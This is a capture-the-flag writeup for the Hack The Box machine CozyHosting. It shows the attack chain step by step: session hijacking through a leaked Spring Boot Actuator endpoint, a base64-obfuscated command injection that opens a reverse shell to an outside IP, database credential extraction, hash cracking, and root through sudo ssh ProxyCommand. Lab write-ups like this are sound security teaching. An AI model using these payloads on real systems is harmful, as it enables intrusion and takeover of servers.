# CozyHosting

Hack The Box machine writeup for CozyHosting.

## Initial Enumeration

To begin enumeration, I performed a full TCP port scan against the target using Nmap:

```shell
sudo nmap -sC -sV -p- 10.10.11.230
```

![Nmap full TCP scan](../../images/cozyhosting/Pasted%20image%2020231208104127.png){.center .shadow width=80%}

The scan identified two open ports:

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80 | HTTP | nginx 1.18.0 (Ubuntu) |

Additional observations:

- The web server is running **nginx on Ubuntu**
- Nmap indicates a redirect to: `http://cozyhosting.htb`

I added the domain to my `/etc/hosts` file.

![Hosts file update](../../images/cozyhosting/Pasted%20image%2020231208104242.png){.center .shadow width=80%}

After adding the target domain to `/etc/hosts`, I navigated to:

`http://cozyhosting.htb`

![CozyHosting landing page](../../images/cozyhosting/Pasted%20image%2020231208104309.png){.center .shadow width=80%}

The landing page presented a standard hosting service interface with minimal publicly exposed functionality. The primary actionable element was a **login portal** accessible via:

`/login`

![Login page](../../images/cozyhosting/Pasted%20image%2020231208104327.png){.center .shadow width=80%}

- Only a login interface was exposed through initial interaction with the application.
- Page source analysis revealed the use of Bootstrap v5.2.3, which does not present any direct security concerns.
- No immediate vulnerabilities or sensitive information were identified, indicating the need for further enumeration.

With limited functionality exposed through manual browsing, I shifted to automated content discovery to identify hidden endpoints.

```shell
dirsearch -u http://cozyhosting.htb
```

![Dirsearch results](../../images/cozyhosting/Pasted%20image%2020231208105618.png){.center .shadow width=80%}

The scan revealed several interesting endpoints, most notably:

```text
/actuator/env
/actuator/configprops
/actuator/beans
/actuator/health
/actuator/mappings
```

Google suggests these endpoints are part of Spring Boot Actuator, which is used for:

- Application monitoring
- Debugging
- Configuration management

Navigating to the discovered endpoint `http://cozyhosting.htb/actuator` revealed a JSON response containing multiple application management endpoints.

![Actuator endpoint list](../../images/cozyhosting/Pasted%20image%2020231208105706.png){.center .shadow width=80%}

While enumerating available Actuator endpoints, I navigated to `http://cozyhosting.htb/actuator/sessions`.

The endpoint returned active session data in the following format:

![Actuator sessions leak](../../images/cozyhosting/Pasted%20image%2020231208105742.png){.center .shadow width=80%}

```json
{"DD4681FDB00EDFA8AC6F893603A5E020":"kanderson"}
```

This looks like a session identifier associated with the user `kanderson`.

After identifying a valid session ID from the `/actuator/sessions` endpoint, I attempted to reuse the session to gain authenticated access.

Using an intercepting proxy, I modified the session cookie in my request:

`Cookie: JSESSIONID=DD4681FDB00EDFA8AC6F893603A5E020`

Upon refreshing the application with the modified session, I was successfully authenticated as `kanderson`, which provided access to the admin dashboard.

![Authenticated dashboard](../../images/cozyhosting/Pasted%20image%2020231208110834.png){.center .shadow width=80%}

![Admin dashboard details](../../images/cozyhosting/Pasted%20image%2020231208110902.png){.center .shadow width=80%}

After gaining access to the admin dashboard, I identified functionality that appeared to initiate SSH connections based on user-supplied input.

The interface included two input fields:

- Hostname
- Username

Testing the functionality revealed that the application constructs and executes a backend command using these values.

Messing with the input a bit, I realized it appeared to be attempting an SSH connection and that there was a possible command injection vulnerability in the username field.

This command injection allowed me to append arbitrary shell syntax. I sent a base64-encoded payload and then set up an `rlwrap nc` listener.

![Command injection payload prep](../../images/cozyhosting/Pasted%20image%2020231211104348.png){.center .shadow width=80%}

```text
host=test&username=;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzEzMzcgMD4mMQo="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
```

![Reverse shell landed](../../images/cozyhosting/Pasted%20image%2020231211104924.png){.center .shadow width=80%}

Why this works:

- `;` terminates the original command
- `${IFS}` replaces spaces to bypass filtering
- Base64 encoding helps avoid bad character restrictions
- The payload is decoded and piped into `bash`, resulting in execution

## More Enumeration

I usually start with a few basic checks, like looking for valid users. A good place to start is `/etc/passwd`.

![Passwd enumeration](../../images/cozyhosting/Pasted%20image%2020231211112933.png){.center .shadow width=80%}

Two notable accounts were identified: `josh` and `postgres`.

To further understand the system, I enumerated active network connections and listening services:

`ss -antup`

![Listening services](../../images/cozyhosting/Pasted%20image%2020231211111713.png){.center .shadow width=80%}

The output revealed a service listening on port `5432`, indicating PostgreSQL.

That suggested credentials might be inside the application JAR file since the app is Spring Boot. Because JAR files are essentially ZIP archives, they can be inspected by extracting their contents.

I moved the file from the box to my machine, though I probably could have copied it locally on the target too.

![JAR file transfer](../../images/cozyhosting/Pasted%20image%2020231211105322.png){.center .shadow width=80%}

![JAR extraction](../../images/cozyhosting/Pasted%20image%2020231211105331.png){.center .shadow width=80%}

To analyze the contents of the JAR file more effectively, I used JD-GUI, a Java decompiler that allows for easy inspection of compiled `.class` files.

This provides a readable view of the application source code, making it easier to identify hardcoded credentials, configuration values, and application logic.

[GitHub - java-decompiler/jd-gui](https://github.com/java-decompiler/jd-gui)

![JD-GUI secrets view](../../images/cozyhosting/Pasted%20image%2020231211110907.png){.center .shadow width=80%}

We have creds:

- Username: `postgres`
- Password: `Vg&nvzAQ7XxR`

Using the credentials recovered from the application configuration, I authenticated to the local PostgreSQL instance:

`psql -h 127.0.0.1 -U postgres`

![Postgres login](../../images/cozyhosting/Pasted%20image%2020231211111916.png){.center .shadow width=80%}

Authentication was successful, providing an interactive PostgreSQL shell.

HackTricks has a solid reference for PostgreSQL enumeration:

[5432,5433 - Pentesting Postgresql - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

After gaining access to the PostgreSQL instance, I enumerated available databases and tables.

I found a database named `cozyhosting` with tables for users and hosts.

![Database list](../../images/cozyhosting/Pasted%20image%2020231211112201.png){.center .shadow width=80%}

![Database table details](../../images/cozyhosting/Pasted%20image%2020231211112441.png){.center .shadow width=80%}

The `users` table was of particular interest:

```sql
SELECT * FROM users;
```

We have an admin hash.

![Admin hash dump](../../images/cozyhosting/Pasted%20image%2020231211112516.png){.center .shadow width=80%}

- Passwords are stored as **bcrypt hashes** (`$2a$10$`)
- Two accounts identified:
  - `kanderson` (User)
  - `admin` (Admin)

After extracting the password using John:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Recovered password: `manchesterunited`

![John crack result](../../images/cozyhosting/Pasted%20image%2020231211112831.png){.center .shadow width=80%}

I started trying to SSH without success. Then I remembered we had another user: `josh`.

And boom, we were in.

![SSH as josh](../../images/cozyhosting/Pasted%20image%2020231211113445.png){.center .shadow width=80%}

Forgot to grab `user.txt` earlier.

![User flag](../../images/cozyhosting/Pasted%20image%2020231211113936.png){.center .shadow width=80%}

Another basic enumeration step I always check is sudo rights. Looks like we got lucky here.

![Sudo rights](../../images/cozyhosting/Pasted%20image%2020231211114603.png){.center .shadow width=80%}

Referencing GTFOBins for `ssh`, I identified a method to execute arbitrary commands using the `ProxyCommand` option.

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![Root via ProxyCommand](../../images/cozyhosting/Pasted%20image%2020231211114931.png){.center .shadow width=80%}

That provided root access and the final flag.
